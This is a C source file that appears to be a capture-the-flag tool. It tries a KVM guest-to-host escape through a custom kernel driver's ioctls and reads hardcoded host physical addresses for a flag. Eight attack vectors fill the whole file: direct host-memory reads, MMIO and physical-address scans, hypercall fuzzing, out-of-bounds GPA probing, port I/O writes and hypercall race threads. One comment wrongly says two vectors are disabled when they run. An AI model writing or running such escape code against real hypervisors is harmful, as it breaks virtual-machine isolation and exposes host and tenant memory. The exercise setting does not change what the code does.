#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <inttypes.h>
#include <pthread.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"
#define DEVICE_PATH_ALT "/dev/kvm_probe_drv"

// Target host physical addresses (from your setup)
#define HOST_WRITE_FLAG_HPA  0x64279a8UL
#define HOST_READ_FLAG_HPA   0x695ee10UL

// IOCTL definitions (from your driver)
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_READ_FILE          0x1013
#define IOCTL_READ_GPA           0x1014
#define IOCTL_WRITE_GPA          0x1015
#define IOCTL_PHYS_TO_VIRT       0x1018
#define IOCTL_READ_HPA           0x1019
#define IOCTL_WRITE_HPA          0x101A
#define IOCTL_ALLOC_SHARED_BUF   0x101B
#define IOCTL_READ_SHARED_BUF    0x101C
#define IOCTL_GET_SHARED_GPA     0x101D

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct gpa_io_data {
    unsigned long gpa;
    unsigned long size;
    unsigned char *user_buffer;
};

struct hpa_io_data {
    unsigned long hpa;
    unsigned long size;
    unsigned char *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
    long ret_value;
};

// Guest memory regions
#define GUEST_RAM_START_1    0x1000UL
#define GUEST_RAM_END_1      0x9fbffUL
#define GUEST_RAM_START_2    0x100000UL
#define GUEST_RAM_END_2      0x7fff9fffUL
#define GUEST_RAM_START_3    0x100000000UL
#define GUEST_RAM_END_3      0x17fffffffUL

void print_banner() {
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║          KVM ESCAPE - Advanced Exploitation Framework         ║\n");
    printf("║                  Multi-Vector Guest-to-Host                    ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n\n");
}

void print_hexdump(const char *prefix, unsigned long addr, unsigned char *data, unsigned long size) {
    printf("\n%s (Base: 0x%lx, Size: %lu bytes)\n", prefix, addr, size);
    printf("Offset      | Hex Bytes                                        | ASCII\n");
    printf("------------|--------------------------------------------------|------------------\n");
    
    for (unsigned long i = 0; i < size; i += 16) {
        printf("+0x%08lx | ", i);
        
        for (unsigned long j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02X ", data[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        
        printf("| ");
        
        for (unsigned long j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = data[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        
        printf("\n");
    }
    printf("\n");
}

int open_device(void) {
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        fd = open(DEVICE_PATH_ALT, O_RDWR);
    }
    if (fd < 0) {
        perror("Failed to open KVM device");
    }
    return fd;
}

unsigned long virt_to_phys_guest(int fd, void *virt_addr) {
    unsigned long virt = (unsigned long)virt_addr;
    unsigned long phys = virt;
    
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &phys) < 0) {
        return 0;
    }
    
    return phys;
}

// ============================================================================
// VECTOR 1: Direct HPA Access via MMIO/ioremap
// ============================================================================
int vector1_direct_hpa_read(int fd) {
    printf("\n[VECTOR 1] Direct HPA Access via ioremap\n");
    printf("=========================================\n");
    printf("Strategy: Try to read host physical addresses directly\n");
    printf("Target: Read flag @ HPA 0x%lx\n\n", HOST_READ_FLAG_HPA);
    
    struct hpa_io_data data = {0};
    data.hpa = HOST_READ_FLAG_HPA;
    data.size = 256;
    data.user_buffer = malloc(data.size);
    
    if (!data.user_buffer) {
        perror("malloc");
        return -1;
    }
    
    printf("[*] Attempting ioremap(0x%lx, %lu)...\n", data.hpa, data.size);
    
    if (ioctl(fd, IOCTL_READ_HPA, &data) < 0) {
        printf("[-] Failed: %s\n", strerror(errno));
        printf("[*] This is expected - ioremap usually fails for arbitrary HPAs\n");
        free(data.user_buffer);
        return -1;
    }
    
    printf("[+] SUCCESS! Read host memory:\n");
    print_hexdump("Host Memory Dump", data.hpa, data.user_buffer, data.size);
    
    // Check if we got the flag
    if (strstr((char*)data.user_buffer, "flag{") || strstr((char*)data.user_buffer, "FLAG{")) {
        printf("\n[!!!] POTENTIAL FLAG FOUND!\n");
    }
    
    free(data.user_buffer);
    return 0;
}

// ============================================================================
// VECTOR 2: MMIO Hole Scanning
// ============================================================================
int vector2_mmio_scanning(int fd) {
    printf("\n[VECTOR 2] MMIO Address Space Scanning\n");
    printf("=======================================\n");
    printf("Strategy: Scan for accessible MMIO regions that might map to host memory\n\n");
    
    // Interesting MMIO ranges to check
    unsigned long ranges[] = {
        0x80000000,   // Above low guest RAM
        0xC0000000,   // PCI MMIO typical
        0xE0000000,   // More PCI space
        0xF0000000,   // High PCI space
        0xFEC00000,   // IOAPIC
        0xFEE00000,   // LAPIC
        HOST_READ_FLAG_HPA & 0xFFFFF000,  // Try flag address page-aligned
        0
    };
    
    for (int i = 0; ranges[i] != 0; i++) {
        unsigned long addr = ranges[i];
        struct mmio_data data = {0};
        data.phys_addr = addr;
        data.size = 4096;
        data.user_buffer = malloc(data.size);
        
        if (!data.user_buffer) continue;
        
        printf("[*] Probing MMIO @ 0x%lx... ", addr);
        fflush(stdout);
        
        if (ioctl(fd, IOCTL_READ_MMIO, &data) == 0) {
            printf("ACCESSIBLE!\n");
            
            // Check if content looks interesting
            int non_zero = 0;
            for (unsigned long j = 0; j < data.size; j++) {
                if (data.user_buffer[j] != 0 && data.user_buffer[j] != 0xFF) {
                    non_zero++;
                }
            }
            
            if (non_zero > 10) {
                printf("[+] Found interesting data (%d non-trivial bytes)\n", non_zero);
                print_hexdump("MMIO Region", addr, data.user_buffer, 256);
            }
        } else {
            printf("inaccessible\n");
        }
        
        free(data.user_buffer);
    }
    
    return 0;
}

// ============================================================================
// VECTOR 3: Hypercall Memory Operations
// ============================================================================
int vector3_hypercall_memory_ops(int fd) {
    printf("\n[VECTOR 3] Hypercall-based Memory Access\n");
    printf("=========================================\n");
    printf("Strategy: Use hypercalls to request host to access specific addresses\n\n");
    
    // First, allocate shared buffer
    unsigned long shared_gpa = 0;
    if (ioctl(fd, IOCTL_ALLOC_SHARED_BUF, &shared_gpa) < 0) {
        printf("[-] Failed to allocate shared buffer\n");
        return -1;
    }
    
    printf("[+] Shared buffer allocated @ GPA 0x%lx\n", shared_gpa);
    
    // Try various hypercall numbers and argument combinations
    unsigned long hypercalls[] = {
        0,    // KVM_HC_VAPIC_POLL_IRQ
        1,    // KVM_HC_MMU_OP
        2,    // KVM_HC_FEATURES
        3,    // KVM_HC_PTP_GET_TIME
        4,    // KVM_HC_KICK_CPU
        5,    // KVM_HC_SEND_IPI
        9,    // KVM_HC_SCHED_YIELD
        10,   // Custom hypercalls might start here
        100,  // Our custom read attempt
        101,  // Our custom write attempt
        0
    };
    
    printf("\n[*] Attempting hypercall-based host memory read\n");
    printf("    Target: 0x%lx\n", HOST_READ_FLAG_HPA);
    printf("    Buffer: 0x%lx\n\n", shared_gpa);
    
    for (int i = 0; hypercalls[i] != 0; i++) {
        struct hypercall_args args = {0};
        args.nr = hypercalls[i];
        args.arg0 = HOST_READ_FLAG_HPA;  // Source (host physical)
        args.arg1 = shared_gpa;           // Destination (guest physical)
        args.arg2 = 256;                  // Size
        args.arg3 = 0;
        
        printf("[*] Hypercall %lu: read(hpa=0x%lx, gpa=0x%lx, size=%lu)\n",
               args.nr, args.arg0, args.arg1, args.arg2);
        
        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) == 0) {
            printf("    Return: %ld (0x%lx)\n", args.ret_value, args.ret_value);
            
            // Check if something was written to our buffer
            unsigned char *buffer = malloc(256);
            if (buffer) {
                unsigned long read_size = 256;
                if (ioctl(fd, IOCTL_READ_SHARED_BUF, buffer) == 0) {
                    int has_data = 0;
                    for (int j = 0; j < 256; j++) {
                        if (buffer[j] != 0) {
                            has_data = 1;
                            break;
                        }
                    }
                    
                    if (has_data) {
                        printf("[+] Shared buffer has data!\n");
                        print_hexdump("Hypercall Result Buffer", shared_gpa, buffer, 256);
                    }
                }
                free(buffer);
            }
        } else {
            printf("    Failed: %s\n", strerror(errno));
        }
    }
    
    return 0;
}

// ============================================================================
// VECTOR 4: GPA Space Expansion
// ============================================================================
int vector4_gpa_expansion(int fd) {
    printf("\n[VECTOR 4] Guest Physical Address Space Expansion\n");
    printf("==================================================\n");
    printf("Strategy: Allocate and map large GPA regions, then try to access\n");
    printf("          addresses that might alias to host memory\n\n");
    
    // Try to mmap large regions at specific addresses
    size_t map_size = 1024 * 1024 * 1024;  // 1GB
    
    // Interesting addresses to try
    unsigned long target_addrs[] = {
        HOST_READ_FLAG_HPA,
        HOST_WRITE_FLAG_HPA,
        0x100000000UL,  // 4GB mark
        0x200000000UL,  // 8GB mark
        0
    };
    
    for (int i = 0; target_addrs[i] != 0; i++) {
        unsigned long target = target_addrs[i];
        
        printf("[*] Attempting to mmap near target 0x%lx\n", target);
        
        // Try to allocate memory
        void *mapped = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        
        if (mapped == MAP_FAILED) {
            printf("[-] mmap failed: %s\n", strerror(errno));
            continue;
        }
        
        printf("[+] Mapped %zu bytes @ %p\n", map_size, mapped);
        
        // Get the GPA of this mapping
        unsigned long gpa = virt_to_phys_guest(fd, mapped);
        if (gpa) {
            printf("[+] GPA: 0x%lx\n", gpa);
            
            // Try to read through this GPA
            struct gpa_io_data data = {0};
            data.gpa = gpa;
            data.size = 4096;
            data.user_buffer = malloc(data.size);
            
            if (data.user_buffer) {
                if (ioctl(fd, IOCTL_READ_GPA, &data) == 0) {
                    printf("[+] Successfully read through GPA\n");
                    print_hexdump("GPA Read", gpa, data.user_buffer, 256);
                }
                free(data.user_buffer);
            }
        }
        
        munmap(mapped, map_size);
    }
    
    return 0;
}

// ============================================================================
// VECTOR 5: EPT Confusion via Out-of-Bounds GPA Access
// ============================================================================
int vector5_ept_confusion(int fd) {
    printf("\n[VECTOR 5] EPT Confusion Attack\n");
    printf("================================\n");
    printf("Strategy: Access GPAs outside documented guest RAM ranges\n");
    printf("          Looking for EPT misconfigurations or wraparounds\n\n");
    
    // Try GPAs that should be outside guest RAM
    unsigned long test_gpas[] = {
        // Just beyond guest RAM regions
        GUEST_RAM_END_2 + 0x1000,
        GUEST_RAM_END_2 + 0x10000,
        
        // High memory addresses
        0x80000000UL,
        0xC0000000UL,
        0x100000000UL - 0x1000,  // Just below 4GB
        
        // Try the actual flag HPAs as GPAs
        HOST_READ_FLAG_HPA,
        HOST_WRITE_FLAG_HPA,
        
        // Try with high bits set
        HOST_READ_FLAG_HPA | 0x8000000000000000UL,
        
        0
    };
    
    for (int i = 0; test_gpas[i] != 0; i++) {
        unsigned long gpa = test_gpas[i];
        
        printf("[*] Probing GPA 0x%lx... ", gpa);
        fflush(stdout);
        
        struct gpa_io_data data = {0};
        data.gpa = gpa;
        data.size = 256;
        data.user_buffer = malloc(data.size);
        
        if (!data.user_buffer) continue;
        
        if (ioctl(fd, IOCTL_READ_GPA, &data) == 0) {
            printf("ACCESSIBLE!\n");
            
            // Check for interesting content
            int interesting = 0;
            for (unsigned long j = 0; j < data.size; j++) {
                if (data.user_buffer[j] >= 32 && data.user_buffer[j] <= 126) {
                    interesting++;
                }
            }
            
            if (interesting > 10) {
                printf("[+] Found potentially interesting data\n");
                print_hexdump("Out-of-bounds GPA", gpa, data.user_buffer, data.size);
            }
        } else {
            printf("inaccessible (%s)\n", strerror(errno));
        }
        
        free(data.user_buffer);
    }
    
    return 0;
}

// ============================================================================
// VECTOR 6: PIO-triggered Memory Access
// ============================================================================
int vector6_pio_memory_tricks(int fd) {
    printf("\n[VECTOR 6] Port I/O Memory Tricks\n");
    printf("==================================\n");
    printf("Strategy: Use port I/O operations to trigger host operations\n");
    printf("          that might access host memory\n\n");
    
    // Common I/O ports that might trigger interesting behavior
    unsigned short interesting_ports[] = {
        0x3F8,   // COM1
        0x2F8,   // COM2  
        0x378,   // LPT1
        0x278,   // LPT2
        0xCF8,   // PCI config address
        0xCFC,   // PCI config data
        0x510,   // QEMU fw_cfg selector
        0x511,   // QEMU fw_cfg data
        0
    };
    
    printf("[*] Scanning I/O ports for interesting behaviors...\n\n");
    
    for (int i = 0; interesting_ports[i] != 0; i++) {
        unsigned short port = interesting_ports[i];
        
        struct port_io_data data = {0};
        data.port = port;
        data.size = 4;
        
        printf("[*] Port 0x%x: ", port);
        fflush(stdout);
        
        if (ioctl(fd, IOCTL_READ_PORT, &data) == 0) {
            printf("0x%08x\n", data.value);
            
            // Try writing and reading back
            data.value = 0xDEADBEEF;
            if (ioctl(fd, IOCTL_WRITE_PORT, &data) == 0) {
                // Read again
                if (ioctl(fd, IOCTL_READ_PORT, &data) == 0) {
                    if (data.value == 0xDEADBEEF) {
                        printf("    [+] Port is writable and readable!\n");
                    }
                }
            }
        } else {
            printf("inaccessible\n");
        }
    }
    
    return 0;
}

// ============================================================================
// VECTOR 7: Race Condition in Hypercalls
// ============================================================================
struct race_thread_args {
    int fd;
    unsigned long target_hpa;
    unsigned long shared_gpa;
    volatile int *stop;
    int thread_id;
};

void* race_thread_func(void *arg) {
    struct race_thread_args *args = (struct race_thread_args*)arg;
    int fd = args->fd;
    unsigned long counter = 0;
    
    printf("[Thread %d] Started racing...\n", args->thread_id);
    
    while (!(*args->stop)) {
        struct hypercall_args hc_args = {0};
        hc_args.nr = 101;  // Custom read hypercall
        hc_args.arg0 = args->target_hpa + (counter % 4096);  // Vary offset
        hc_args.arg1 = args->shared_gpa;
        hc_args.arg2 = 64;
        hc_args.arg3 = counter;
        
        ioctl(fd, IOCTL_HYPERCALL_ARGS, &hc_args);
        counter++;
        
        if (counter % 10000 == 0) {
            printf("[Thread %d] Iteration %lu (ret=%ld)\n", 
                   args->thread_id, counter, hc_args.ret_value);
        }
    }
    
    printf("[Thread %d] Completed %lu iterations\n", args->thread_id, counter);
    return NULL;
}

int vector7_race_conditions(int fd) {
    printf("\n[VECTOR 7] Race Condition Exploitation\n");
    printf("=======================================\n");
    printf("Strategy: Create race conditions in hypercall handlers\n");
    printf("          by making concurrent requests\n\n");
    
    unsigned long shared_gpa = 0;
    if (ioctl(fd, IOCTL_ALLOC_SHARED_BUF, &shared_gpa) < 0) {
        printf("[-] Failed to allocate shared buffer\n");
        return -1;
    }
    
    printf("[+] Shared buffer @ GPA 0x%lx\n", shared_gpa);
    printf("[*] Starting 4 racing threads for 5 seconds...\n\n");
    
    volatile int stop = 0;
    pthread_t threads[4];
    struct race_thread_args args[4];
    
    for (int i = 0; i < 4; i++) {
        args[i].fd = open_device();
        args[i].target_hpa = HOST_READ_FLAG_HPA;
        args[i].shared_gpa = shared_gpa;
        args[i].stop = &stop;
        args[i].thread_id = i;
        
        pthread_create(&threads[i], NULL, race_thread_func, &args[i]);
    }
    
    sleep(5);
    stop = 1;
    
    for (int i = 0; i < 4; i++) {
        pthread_join(threads[i], NULL);
        close(args[i].fd);
    }
    
    // Check if anything interesting ended up in the shared buffer
    unsigned char *buffer = malloc(4096);
    if (buffer) {
        if (ioctl(fd, IOCTL_READ_SHARED_BUF, buffer) == 0) {
            printf("\n[*] Checking shared buffer after race...\n");
            print_hexdump("Post-Race Buffer", shared_gpa, buffer, 256);
        }
        free(buffer);
    }
    
    return 0;
}

// ============================================================================
// VECTOR 8: Systematic Memory Scanning
// ============================================================================
int vector8_memory_scanning(int fd) {
    printf("\n[VECTOR 8] Systematic Memory Scanning\n");
    printf("======================================\n");
    printf("Strategy: Systematically scan physical address space\n");
    printf("          looking for accessible regions\n\n");
    
    printf("[*] Scanning from 0x0 to 0x100000000 (4GB) in 16MB chunks...\n");
    printf("[*] This will take a while...\n\n");
    
    unsigned long chunk_size = 16 * 1024 * 1024;  // 16MB
    unsigned long test_size = 4096;
    int found_count = 0;
    
    for (unsigned long addr = 0; addr < 0x100000000UL; addr += chunk_size) {
        struct mmio_data data = {0};
        data.phys_addr = addr;
        data.size = test_size;
        data.user_buffer = malloc(data.size);
        
        if (!data.user_buffer) continue;
        
        // Try as MMIO first
        if (ioctl(fd, IOCTL_READ_MMIO, &data) == 0) {
            // Check for non-trivial content
            int interesting = 0;
            for (unsigned long i = 0; i < test_size; i++) {
                if (data.user_buffer[i] != 0 && data.user_buffer[i] != 0xFF) {
                    interesting++;
                }
            }
            
            if (interesting > 100) {
                printf("[+] Found interesting region @ 0x%lx (%d/%lu bytes non-trivial)\n",
                       addr, interesting, test_size);
                print_hexdump("Discovered Region", addr, data.user_buffer, 256);
                found_count++;
                
                if (found_count >= 10) {
                    printf("[*] Found 10 regions, stopping scan...\n");
                    free(data.user_buffer);
                    break;
                }
            }
        }
        
        free(data.user_buffer);
        
        // Progress indicator
        if (addr % (256 * 1024 * 1024) == 0) {
            printf("[*] Progress: 0x%lx / 0x100000000 (%.1f%%)\n", 
                   addr, (double)addr / 0x100000000UL * 100.0);
        }
    }
    
    return 0;
}

// ============================================================================
// Main Exploit Orchestrator
// ============================================================================
int main(int argc, char *argv[]) {
    print_banner();
    
    int fd = open_device();
    if (fd < 0) {
        printf("[-] Failed to open device. Is the kernel module loaded?\n");
        return 1;
    }
    
    printf("[+] Device opened successfully (fd=%d)\n", fd);
    printf("[*] Target Read Flag HPA:  0x%lx\n", HOST_READ_FLAG_HPA);
    printf("[*] Target Write Flag HPA: 0x%lx\n\n", HOST_WRITE_FLAG_HPA);
    
    if (argc > 1) {
        // Run specific vector
        int vector = atoi(argv[1]);
        switch(vector) {
            case 1: vector1_direct_hpa_read(fd); break;
            case 2: vector2_mmio_scanning(fd); break;
            case 3: vector3_hypercall_memory_ops(fd); break;
            case 4: vector4_gpa_expansion(fd); break;
            case 5: vector5_ept_confusion(fd); break;
            case 6: vector6_pio_memory_tricks(fd); break;
            case 7: vector7_race_conditions(fd); break;
            case 8: vector8_memory_scanning(fd); break;
            default:
                printf("[-] Unknown vector %d\n", vector);
                printf("[*] Valid vectors: 1-8\n");
        }
    } else {
        // Run all vectors
        printf("[*] Running all attack vectors...\n");
        printf("[*] Use '%s <1-8>' to run a specific vector\n\n", argv[0]);
        
        vector1_direct_hpa_read(fd);
        vector2_mmio_scanning(fd);
        vector3_hypercall_memory_ops(fd);
        vector4_gpa_expansion(fd);
        vector5_ept_confusion(fd);
        vector6_pio_memory_tricks(fd);
        vector7_race_conditions(fd);  // Commented out by default (intensive)
        vector8_memory_scanning(fd);   // Commented out by default (very slow)
    }
    
    printf("\n[*] Exploitation attempts complete\n");
    close(fd);
    return 0;
}
